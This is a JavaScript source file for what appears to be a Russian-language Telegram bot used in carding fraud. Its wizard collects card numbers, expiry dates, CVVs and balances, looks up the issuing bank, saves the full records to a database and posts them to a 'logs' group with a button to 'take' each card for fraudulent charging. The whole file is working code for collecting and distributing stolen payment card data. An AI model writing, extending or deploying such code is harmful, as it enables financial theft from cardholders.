const WizardScene = require("telegraf/scenes/wizard");
const { Telegram, Markup } = require("telegraf");
const { User, Log } = require("../database");
const axios = require("axios");

const bot = new Telegram(process.env.BOT_TOKEN);

// Функция для получения данных о карте
async function getCardInfo1(cardNumber) {
  try {
    let text = "";

    const res = await axios.get(`https://bins.antipublic.cc/bins/${cardNumber}`);

    if (res.data.bank) {
      text += `\n🏦 Банк: <b>${res.data.bank}</b>`;
    }

    if (res.data.country_name) {
      text += `\n🌏 Страна: <b>${res.data.country_name}</b>`;
    }

    if (!text) {
      text = "<b>неизвестно</b>";
    }

    return text;
  } catch (err) {
    console.log(err);
    return "<b>неизвестно</b>";
  }
}

const scene = new WizardScene(
  "send_log",
  async (ctx) => {
    try {
      await ctx.scene.reply(`Введите номер карты:`, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "money_cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      ctx.scene.state.cardNumber = String(ctx.message.text).replace(/\D+/g, ""); // Сохраняем номер карты в состояние сцены

      // Получаем информацию о карте
      ctx.scene.state.cardInfo = await getCardInfo1(ctx.scene.state.cardNumber);

      await ctx.scene.reply(`Введите срок действия карты (MM/YY):`, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "money_cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      ctx.scene.state.cardExpire = String(ctx.message.text).replace(/[^0-9\/]+/g, ""); // Сохраняем срок действия карты
      await ctx.scene.reply(`Введите CVV карты:`, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "money_cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      ctx.scene.state.cardCvv = String(ctx.message.text).replace(/\D+/g, ""); // Сохраняем CVV
      await ctx.scene.reply(`Введите баланс карты:`, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "money_cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      ctx.scene.state.cardBalance = String(ctx.message.text).replace(/\D+/g, ""); // Сохраняем баланс карты
      const settings = ctx.state.bot;

      // Создаем запись в базе данных, но пока не сохраняем chatMsg
      const log = await Log.create({
        token: Math.random() + new Date().valueOf() + Math.random(),
        cardNumber: ctx.scene.state.cardNumber,
        cardExpire: ctx.scene.state.cardExpire,
        cardCvv: ctx.scene.state.cardCvv,
        cardHolder: ctx.from.username, // или другой доступный параметр, если имя держателя карты вводится отдельно
        otherInfo: {
          cardBalance: ctx.scene.state.cardBalance, // Сохраняем введенный баланс карты
        },
        writerId: null,
        adId: 0, // Замените на актуальный adId, если он известен
        userId: ctx.from.id, // ID пользователя
        chatMsg2: null, // Изначально значение null
      });

      const cardDetailsMessage = `
👤 Пользователь <b>@${ctx.from.username}</b> | <code>${ctx.from.id}</code> прислал данные карты:

💰 Баланс: <b>${ctx.scene.state.cardBalance} USD</b>

💳 Номер карты: <code>${ctx.scene.state.cardNumber}</code>
${ctx.scene.state.cardInfo}
`;

      // Отправляем сообщение и сохраняем ID сообщения
      const sentMessage = await bot.sendMessage(
        settings.logsGroupId, // ID вашего канала или группы
        cardDetailsMessage,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("✍️ Взять на вбив", `take_log1_${log.id}`)],
          ]),
        }
      );

      // Обновляем запись в базе данных с ID отправленного сообщения
      await log.update({
        chatMsg2: sentMessage.message_id, // Сохраняем ID сообщения в базе данных
      });

      await ctx.reply(
        `✅ Данные карты успешно отправлены.`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("◀️ В главное меню", `start`)],
          ]),
        }
      );
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  }
);

module.exports = scene;
